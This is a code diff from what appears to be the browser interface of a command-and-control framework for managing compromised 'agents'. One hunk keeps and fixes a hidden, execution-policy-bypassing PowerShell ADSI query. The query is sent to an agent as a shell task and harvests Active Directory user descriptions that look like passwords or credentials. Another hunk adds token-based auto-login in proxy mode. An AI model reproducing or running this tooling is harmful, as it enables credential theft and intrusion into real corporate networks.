@@ -3081,7 +3081,7 @@ async function runCtxAction(act) {
     case 'adPassDesc': {
       const aid = act.id || activeAgent?.id; if (!aid) break;
       // PowerShell ADSI query — no RSAT needed, works on any domain member
-      const ps = String.raw`$s=[adsisearcher]'(&(objectCategory=person)(objectClass=user)(description=*))';$s.PageSize=1000;$s.FindAll()|%{$u=$_.Properties['samaccountname'][0];$d=$_.Properties['description'][0];if($d -match 'pass|pwd|secret|cred|login|\b[A-Z][a-z]+\d+\b|!|@'){Write-Output "$u`t$d"}}`;
+      const ps = `$s=[adsisearcher]'(&(objectCategory=person)(objectClass=user)(description=*))';$s.PageSize=1000;$s.FindAll()|%{$u=$_.Properties['samaccountname'][0];$d=$_.Properties['description'][0];if($d -match 'pass|pwd|secret|cred|login|\\b[A-Z][a-z]+\\d+\\b|!|@'){Write-Output "$u\`t$d"}}`;
       const r = await api('POST', `/api/agents/${aid}/task`, {
         type: 'SHELL',
         args: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "${ps}"`,
@@ -3896,7 +3896,14 @@ window.onload = () => {
   document.addEventListener('keydown', e => { if (e.key === 'Meta') _superDown = true; });
   document.addEventListener('keyup',   e => { if (e.key === 'Meta') _superDown = false; });
   document.addEventListener('keydown', kbShortcuts);
-  if (!window.__GUI_TOKEN__) {
+  if (window.__GUI_TOKEN__) {
+    // Proxy mode: auto-login using injected token
+    BASE  = window.location.origin;
+    TOKEN = window.__GUI_TOKEN__;
+    OPERATOR = 'gui';
+    closeModal('modal-login');
+    initApp();
+  } else {
     const saved = localStorage.getItem('c2_session');
     if (saved) {
       try {
@@ -3909,8 +3916,6 @@ window.onload = () => {
       document.getElementById('login-url').value = window.location.origin;
     }
   }
-  // In proxy mode (__GUI_TOKEN__ set) the URL is pre-filled server-side.
-  // Token is never pre-filled — user must type it from the CLI output.
 
   // Global drag/pan listeners for agent graph
   document.addEventListener('mousemove', e => {
